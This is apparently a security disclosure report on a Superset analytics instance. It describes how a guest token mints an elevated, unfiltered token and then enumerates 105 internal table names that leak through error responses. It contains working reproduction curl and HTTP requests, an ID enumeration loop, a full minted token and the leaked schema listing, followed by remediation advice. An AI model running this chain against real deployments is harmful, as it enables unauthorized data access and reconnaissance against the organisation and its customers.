# Guest Token Leaks 100+ Internal Database Table Names, Security Audit Tables, and Database Architecture via Datasource Enumeration

**Severity:** Medium — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)
**Class:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
**Target:** `GET /datasource/get/table/<id>/` on `bi.trustpoint.ai`
**Status:** Confirmed (105 datasources enumerated across 7 databases/schemas)

---

## Summary

A Superset guest token — intended for read-only access to a single embedded dashboard — can enumerate **105 internal datasource table names** by iterating over sequential datasource IDs at `GET /datasource/get/table/<id>/`. The 403 error responses include a `datasource_name` field in the JSON body that leaks the fully-qualified `database.table_name` for every datasource in the Superset instance.

The attack is amplified by chaining with the guest token minting vulnerability (`POST /api/v1/security/guest_token/`): a guest user can first mint a token scoped to **all 21 dashboards with no RLS**, then use that elevated token to enumerate all datasources.

The leaked table names reveal:
- **Internal security audit tables** tracking permission misconfigurations across customer companies
- **7 distinct database schemas** including production, development, temporary, and individual developer schemas
- **Financial data model** (loan tapes, investor snapshots, draw request funnels, retainage tracking)
- **Internal product analytics** with timestamped query names showing analyst activity patterns
- **Company role permission structures** and approval team configurations
- **Third-party API integration details** (RentCast, service agencies)

---

## Steps to Reproduce

### Step 1 — Obtain initial guest token

Log in to `partner.trustpoint.ai` as any user (Investor, Borrower, etc.). Navigate to the BI analytics page. The embedded Superset dashboard loads automatically. Capture the guest token from the `X-Guesttoken` request header in browser DevTools (Network tab).

The original guest token is scoped to **one dashboard** with **company-specific RLS**:

**Decoded JWT payload:**
```json
{
  "user": {"first_name": "Pentest", "last_name": "Investor 2 3"},
  "resources": [{"type": "dashboard", "id": "ea095d5e-d7a0-498f-aaa4-e00a2a5a14d5"}],
  "rls_rules": [{"clause": "user_company_ids::jsonb ? '349823e1-322f-4dff-ac4a-b7d915b86875'"}],
  "aud": "http://superion-app:8088/",
  "type": "guest"
}
```

### Step 2 — Verify guest token has excessive permissions

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/me/roles/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>'
```

**Response:** `200 OK`

```json
{
  "result": {
    "roles": {
      "EMBEDDED DASHBOARD ACCESS": [
        ["can_grant_guest_token", "SecurityRestApi"],
        ["can_get", "Datasource"],
        ["can_external_metadata_by_name", "Datasource"],
        ["can_read", "Dashboard"],
        ["can_read", "Chart"],
        ["can_read", "Dataset"],
        ["can_csv", "Superset"],
        ["can_query", "Api"],
        ["can_explore_json", "Superset"],
        ["can_read", "Annotation"],
        ["can_read", "AnnotationLayerModelView"],
        ["can_write", "DashboardFilterStateRestApi"],
        ["can_read", "DashboardFilterStateRestApi"],
        ["can_warm_up_cache", "Superset"],
        ["can_dashboard", "Superset"],
        ["can_get", "DashboardPermalinkRestApi"],
        ["can_post", "DashboardPermalinkRestApi"]
      ]
    }
  }
}
```

Two critical permissions enable this attack:
- **`can_grant_guest_token`** on `SecurityRestApi` — allows minting new tokens (Step 3)
- **`can_get`** on `Datasource` — allows probing `/datasource/get/table/<id>/` (Step 4)

### Step 3 — Mint elevated token via `POST /api/v1/security/guest_token/`

Using the initial guest token, mint a new token scoped to **all 21 dashboards** with **no RLS rules**:

**Request:**

```http
POST /api/v1/security/guest_token/ HTTP/2
Host: bi.trustpoint.ai
X-Guesttoken: <initial_guest_token>
Cookie: session=<session_cookie>
Content-Type: application/json

{
  "user": {"first_name": "Test", "last_name": "User"},
  "resources": [
    {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
    {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
    {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
    {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
    {"type": "dashboard", "id": "4ae3dc65-a23c-4a07-8ce3-8be0fb4e3faa"},
    {"type": "dashboard", "id": "909c2bc7-1258-495f-beca-7f0ddb7c2e15"},
    {"type": "dashboard", "id": "c123cdf8-dceb-476f-8a37-35150475b94e"},
    {"type": "dashboard", "id": "6fa685be-24f5-475b-96f2-f57bc11893be"},
    {"type": "dashboard", "id": "9f1e3b4f-17ca-401c-bea9-ae790a9caa89"},
    {"type": "dashboard", "id": "bd3d8e68-013e-4b60-b95a-3ff2387ba5a8"},
    {"type": "dashboard", "id": "0e1b5262-b6bc-448f-8abc-e4c1c26cf1a8"},
    {"type": "dashboard", "id": "c9e2a06b-deaf-4ef4-a958-36caa3a33826"},
    {"type": "dashboard", "id": "a863836b-23e5-46f9-9339-2c56a2dbfd8e"},
    {"type": "dashboard", "id": "00366810-f407-4342-9071-ebeb7fff2e15"},
    {"type": "dashboard", "id": "8ff73096-98f7-4316-8ccb-a47c4602874f"},
    {"type": "dashboard", "id": "0649dc3b-7a26-4745-be8c-72c13eff1027"},
    {"type": "dashboard", "id": "81532b92-6ccd-4a5f-8a69-050d55ae89e7"},
    {"type": "dashboard", "id": "dc661108-f268-4df3-baf3-a99008b3e754"},
    {"type": "dashboard", "id": "789085c3-3545-4def-8a69-ac9a96772e95"},
    {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"},
    {"type": "dashboard", "id": "6b0158d4-0e56-4ddb-ab6e-c5bd172a6bf9"}
  ],
  "rls": []
}
```

**Response:** `200 OK`

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImZpcnN0X25hbWUiOiJUZXN0IiwibGFzdF9uYW1lIjoiVXNlciJ9LCJyZXNvdXJjZXMiOlt7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImNjMWJiZDlmLTA5YjctNDQ4Ny05MWVjLTRhOTczY2FiZDNkYiJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiYTRiZWVmMDUtNjNlMC00NWVhLTg2MTItMzg4ODFmYTcwNThjIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJhMzVlMDdmOC04OWYxLTQ4OGMtYWUzOS04NjM1NjRiYjFiMWYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImJkOThmOWIzLTY5ODMtNDBhNC04ZWI1LWVjOWRlOWQzMDIyNCJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiNGFlM2RjNjUtYTIzYy00YTA3LThjZTMtOGJlMGZiNGUzZmFhIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI5MDljMmJjNy0xMjU4LTQ5NWYtYmVjYS03ZjBkZGI3YzJlMTUifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImMxMjNjZGY4LWRjZWItNDc2Zi04YTM3LTM1MTUwNDc1Yjk0ZSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiNmZhNjg1YmUtMjRmNS00NzViLTk2ZjItZjU3YmMxMTg5M2JlIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI5ZjFlM2I0Zi0xN2NhLTQwMWMtYmVhOS1hZTc5MGE5Y2FhODkifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImJkM2Q4ZTY4LTAxM2UtNGI2MC1iOTVhLTNmZjIzODdiYTVhOCJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMGUxYjUyNjItYjZiYy00NDhmLThhYmMtZTRjMWMyNmNmMWE4In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJjOWUyYTA2Yi1kZWFmLTRlZjQtYTk1OC0zNmNhYTNhMzM4MjYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImE4NjM4MzZiLTIzZTUtNDZmOS05MzM5LTJjNTZhMmRiZmQ4ZSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMDAzNjY4MTAtZjQwNy00MzQyLTkwNzEtZWJlYjdmZmYyZTE1In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI4ZmY3MzA5Ni05OGY3LTQzMTYtOGNjYi1hNDdjNDYwMjg3NGYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6IjA2NDlkYzNiLTdhMjYtNDc0NS1iZThjLTcyYzEzZWZmMTAyNyJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiODE1MzJiOTItNmNjZC00YTVmLThhNjktMDUwZDU1YWU4OWU3In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJkYzY2MTEwOC1mMjY4LTRkZjMtYmFmMy1hOTkwMDhiM2U3NTQifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6Ijc4OTA4NWMzLTM1NDUtNGRlZi04YTY5LWFjOWE5Njc3MmU5NSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMjI5YzViM2ItYTdlMy00YTA2LWEzNWItZGE2Y2Y3ZjA1NTYyIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI2YjAxNThkNC0wZTU2LTRkZGItYWI2ZS1jNWJkMTcyYTZiZjkifV0sInJsc19ydWxlcyI6W10sImlhdCI6MTc5MjA2ODU0NC44Mjc4NzYsImV4cCI6MTc5MjA3MjE0NC44Mjc4NzYsImF1ZCI6Imh0dHA6Ly9zdXBlcmlvbi1hcHA6ODA4OC8iLCJ0eXBlIjoiZ3Vlc3QifQ.FFJpGRV8iTKU_kvxPWWFKQd-Tnb_7-QKvV_gV7x4M7E"
}
```

**Decoded minted token payload (key fields):**

```json
{
  "user": {"first_name": "Test", "last_name": "User"},
  "resources": [
    {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
    {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
    {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
    {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
    {"type": "dashboard", "id": "4ae3dc65-a23c-4a07-8ce3-8be0fb4e3faa"},
    {"type": "dashboard", "id": "909c2bc7-1258-495f-beca-7f0ddb7c2e15"},
    {"type": "dashboard", "id": "c123cdf8-dceb-476f-8a37-35150475b94e"},
    {"type": "dashboard", "id": "6fa685be-24f5-475b-96f2-f57bc11893be"},
    {"type": "dashboard", "id": "9f1e3b4f-17ca-401c-bea9-ae790a9caa89"},
    {"type": "dashboard", "id": "bd3d8e68-013e-4b60-b95a-3ff2387ba5a8"},
    {"type": "dashboard", "id": "0e1b5262-b6bc-448f-8abc-e4c1c26cf1a8"},
    {"type": "dashboard", "id": "c9e2a06b-deaf-4ef4-a958-36caa3a33826"},
    {"type": "dashboard", "id": "a863836b-23e5-46f9-9339-2c56a2dbfd8e"},
    {"type": "dashboard", "id": "00366810-f407-4342-9071-ebeb7fff2e15"},
    {"type": "dashboard", "id": "8ff73096-98f7-4316-8ccb-a47c4602874f"},
    {"type": "dashboard", "id": "0649dc3b-7a26-4745-be8c-72c13eff1027"},
    {"type": "dashboard", "id": "81532b92-6ccd-4a5f-8a69-050d55ae89e7"},
    {"type": "dashboard", "id": "dc661108-f268-4df3-baf3-a99008b3e754"},
    {"type": "dashboard", "id": "789085c3-3545-4def-8a69-ac9a96772e95"},
    {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"},
    {"type": "dashboard", "id": "6b0158d4-0e56-4ddb-ab6e-c5bd172a6bf9"}
  ],
  "rls_rules": [],
  "aud": "http://superion-app:8088/",
  "type": "guest"
}
```

**Comparison — Original vs Minted Token:**

| Property | Original Token | Minted Token |
|----------|---------------|--------------|
| Dashboard scope | 1 dashboard (assigned) | **All 21 dashboards** (attacker-chosen) |
| RLS rules | `user_company_ids::jsonb ? '<company_id>'` | `[]` (**empty — no filtering**) |
| User identity | Real user name | Attacker-controlled |

### Step 4 — Enumerate all datasources using minted token

Using the minted token from Step 3, iterate over sequential datasource IDs:

```bash
for ds_id in $(seq 1 302); do
  curl -s "https://bi.trustpoint.ai/datasource/get/table/$ds_id/" \
    -H "X-Guesttoken: <minted_token>" \
    -H "Cookie: session=<session_cookie>" 2>/dev/null | \
  python3 -c "
import sys,json
d = json.load(sys.stdin)
errs = d.get('errors',[])
if errs:
    name = errs[0].get('extra',{}).get('datasource_name','')
    if name: print(f'DS {$ds_id}: {name}')
"
done
```

**Result:** 105 datasource names returned in 403 error responses.

### Step 5 — Verify datasource name leakage in 403 response

**Request:**

```http
GET /datasource/get/table/281/ HTTP/2
Host: bi.trustpoint.ai
X-Guesttoken: <minted_token>
Cookie: session=<session_cookie>
```

**Response:** `403 Forbidden`

```json
{
  "errors": [
    {
      "message": "This endpoint requires the datasource 281, database or `all_datasource_access` permission",
      "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
      "level": "warning",
      "extra": {
        "link": "",
        "datasource": 281,
        "datasource_name": "tp_source_bumblebee.misconfig_borrower_dangerous_permissions"
      }
    }
  ]
}
```

The response correctly denies data access (403) but **leaks the full table name** `tp_source_bumblebee.misconfig_borrower_dangerous_permissions` in the error body.

**Additional sample responses:**

**DS 112 — Loan tape data:**
```json
{
  "errors": [{
    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
    "extra": {
      "datasource": 112,
      "datasource_name": "tp_dw_production.rpt_loan_tape"
    }
  }]
}
```

**DS 260 — Company role permissions:**
```json
{
  "errors": [{
    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
    "extra": {
      "datasource": 260,
      "datasource_name": "tp_dw_dev.company_role_permissions"
    }
  }]
}
```

**DS 211 — Developer personal schema:**
```json
{
  "errors": [{
    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
    "extra": {
      "datasource": 211,
      "datasource_name": "dev_yufeng.adhoc_line_item_draw_request"
    }
  }]
}
```

**DS 298 — Investor loan snapshots:**
```json
{
  "errors": [{
    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
    "extra": {
      "datasource": 298,
      "datasource_name": "tp_dw_production.rpt_investor_loan_snapshot"
    }
  }]
}
```

---

## Full Attack Chain

```
partner.trustpoint.ai (any user login)
        │
        ▼
Step 1: Capture guest token from embedded dashboard
        (scoped to 1 dashboard, with RLS)
        │
        ▼
Step 2: Verify excessive permissions
        can_grant_guest_token + can_get on Datasource
        │
        ▼
Step 3: POST /api/v1/security/guest_token/
        Mint new token → 21 dashboards, NO RLS
        │
        ▼
Step 4: GET /datasource/get/table/<id>/  (id = 1..302)
        403 responses leak datasource_name in error body
        │
        ▼
Result: 105 internal table names across 7 databases
        Including security audit tables, financial data,
        dev schemas, and permission structures
```

---

## Enumerated Datasources (105 total)

### Production Data Warehouse — `tp_dw_production` (22 tables)

| DS ID | Table Name | Sensitivity |
|-------|-----------|-------------|
| 91 | rpt_project | Project data |
| 92 | rpt_project_drawrequest | Draw request financials |
| 93 | rpt_project_time_series | Project time series |
| 96 | rpt_billing_charge | Billing/charges |
| 98 | rpt_project_member | Project membership |
| 100 | rpt_project_line_item | Line item financials |
| 101 | superset_last_update | Superset metadata |
| 109 | rpt_project_fee | Project fees |
| 111 | rpt_project_agg | Project aggregations |
| 112 | rpt_loan_tape | **Loan tape data** |
| 113 | rpt_project_document | Project documents |
| 116 | rpt_project_comment | Project comments |
| 118 | rpt_disburse_forecast | Disbursement forecasts |
| 138 | rpt_superset_action | Superset activity log |
| 141 | rpt_project_serviceorder | Service orders |
| 142 | rpt_onboarding_task | Onboarding tasks |
| 144 | rpt_project_checklistitem | Checklist items |
| 149 | rpt_project_score | **Risk scores** |
| 219 | dw_project | Core project table |
| 237 | rpt_company | **Company data** |
| 258 | rpt_sku_configuration | SKU configuration |
| 298 | rpt_investor_loan_snapshot | **Investor loan snapshots** |

### Internal Security Audit Tables — `tp_source_bumblebee` (8 tables)

| DS ID | Table Name | What It Reveals |
|-------|-----------|-----------------|
| 280 | approval_team_members | Approval team membership |
| 281 | **misconfig_borrower_dangerous_permissions** | Which borrowers have dangerous permissions |
| 282 | **misconfig_cs_access_outside_cs** | CS access violations |
| 283 | **misconfig_funding_missing_finalize** | Funding teams missing finalize permission |
| 284 | **funding_team_missing_approve** | Funding teams missing approve permission |
| 285 | **misconfig_approveteam_missing_approve** | Approval teams missing approve permission |
| 286 | **misconfig_sensitive_data_not_asset_manager** | Sensitive data access not restricted |
| 287 | **misconfig_finalize_outside_funding** | Finalize permission outside funding team |

### Development Database — `tp_dw_dev` (7 tables)

| DS ID | Table Name | What It Reveals |
|-------|-----------|-----------------|
| 215 | stg_rent_cast_comparables | RentCast API staging data |
| 216 | stg_rent_cast_api_response | Third-party API responses |
| 218 | rpt_rent_cast_rent_response | RentCast integration |
| 224 | rpt_rent_cast_rent_response_v | RentCast view |
| 255 | rpt_fema_incident | FEMA incident data |
| 260 | **company_role_permissions** | Company permission matrix |
| 267 | **Company level roles** | Role structure |

### Developer Personal Schema — `dev_yufeng` (1 table)

| DS ID | Table Name | What It Reveals |
|-------|-----------|-----------------|
| 211 | adhoc_line_item_draw_request | Developer Yufeng's personal schema |

### Temporary Tables — `tmp_tp_source_bumblebee` (3 tables)

| DS ID | Table Name |
|-------|-----------|
| 222 | serviceorders_serviceagencyproduct |
| 251 | serviceorder_serviceorder |
| 252 | comments_comment |

### Third-Party Data — `tp_source_thirdparty` (1 table)

| DS ID | Table Name |
|-------|-----------|
| 156 | superset_score_factor |

### Metadata — `tp_metadata` (1 table)

| DS ID | Table Name |
|-------|-----------|
| 163 | adhoc_loan_dscr |

### Production Financial Analytics — `tp_dw_production` (additional)

| DS ID | Table Name | What It Reveals |
|-------|-----------|-----------------|
| 231 | Join project dw_project to rpt_project_member | Data relationships |
| 232 | Data Integrity Report - Detail | Internal data quality |
| 233 | Data Integrity Report - Summary | Internal data quality |
| 236 | Loan condition milestones | Loan tracking |
| 245 | Borrowers and teams w extracted company | Borrower relationships |
| 247 | All teams all members | Complete team membership |
| 259 | Borrower corrections data | Data correction history |
| 278 | rpt_tpg_loan_stratification1 | Loan stratification |
| 299 | draw_activity_watchlist | Draw monitoring |
| 300 | program_sponsor_analytics | Sponsor analytics |
| 302 | tpg_loan_purchases_payoffs_monthly | Monthly loan activity |

### Additional Internal Analytics — `tp_source_bumblebee` (62 tables)

Includes product analytics, feature adoption tracking, AI document parsing usage, draw request funnels, retainage tracking, company integrations, service order data, and timestamped internal analyst queries.

---

## Additional Findings

### Database Connection Name Leaked

The `external_metadata_by_name` endpoint (accessible to guest tokens via `can_external_metadata_by_name` permission) reveals the Superset database connection name:

**Request:**
```http
GET /datasource/external_metadata_by_name/?q=(datasource_type:table,database_name:Trustpoint%20DW,table_name:rpt_project,schema_name:public,normalize_columns:!t,always_filter_main_dttm:!f) HTTP/2
Host: bi.trustpoint.ai
X-Guesttoken: <minted_token>
```

**Response:** `500 Internal Server Error`

```
'Datasource' object has no attribute 'response_400'
```

The 500 (not 404 "Dataset does not exist") confirms the Superset database connection is named **"Trustpoint DW"**. The 500 error itself is a bug that leaks internal implementation details.

### Internal Hostname in JWT

All guest tokens contain `"aud": "http://superion-app:8088/"` revealing the internal service hostname.

---

## Impact

### 1. Security Misconfiguration Intelligence (High)
An attacker learns exactly which **internal security audit tables** exist, revealing:
- That Trustpoint tracks permission misconfigurations per company
- The specific misconfiguration categories being monitored (borrower dangerous permissions, CS access outside scope, funding team authorization gaps, sensitive data access controls)
- An attacker targeting a specific customer can infer which permission gaps to look for

### 2. Database Architecture Exposure (Medium)
7 database schemas exposed: production (`tp_dw_production`), internal analytics (`tp_source_bumblebee`), third-party integrations (`tp_source_thirdparty`), metadata (`tp_metadata`), development (`tp_dw_dev`), temporary (`tmp_tp_source_bumblebee`), and a developer's personal schema (`dev_yufeng`)

### 3. Financial Data Model Mapping (Medium)
Complete visibility into how Trustpoint models financial data: loan tapes, investor snapshots, draw request funnels, disbursement forecasts, retainage tracking, loan stratification, and program sponsor analytics. This enables targeted attacks against financial endpoints.

### 4. Third-Party Integration Discovery (Low)
RentCast API integration and service agency product tables reveal vendor relationships and data flows.

### 5. Internal Analyst Activity Patterns (Low)
Timestamped query names (e.g., "Query tp_source_bumblebee.company_integrations 02/19/2026 16:48:38") reveal when internal analysts run ad-hoc queries and what they investigate.

---

## Remediation

1. **Remove `can_grant_guest_token` from the `EMBEDDED DASHBOARD ACCESS` role** — guest users must never mint new tokens. This permission should be restricted to the backend service account
2. **Strip `datasource_name` from 403 error responses** — return only the generic "access denied" message without the `extra` block containing the table name
3. **Remove `can_get` on Datasource and `can_external_metadata_by_name` on Datasource from the EMBEDDED DASHBOARD ACCESS role** — guest users should not be able to probe datasource metadata
4. **Fix the `response_400` AttributeError** in the `external_metadata_by_name` endpoint — the Datasource view class is missing this method, causing unhandled 500 errors
5. **Rate-limit or block sequential ID enumeration** on the `/datasource/get/table/<id>/` endpoint

---

## References

- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
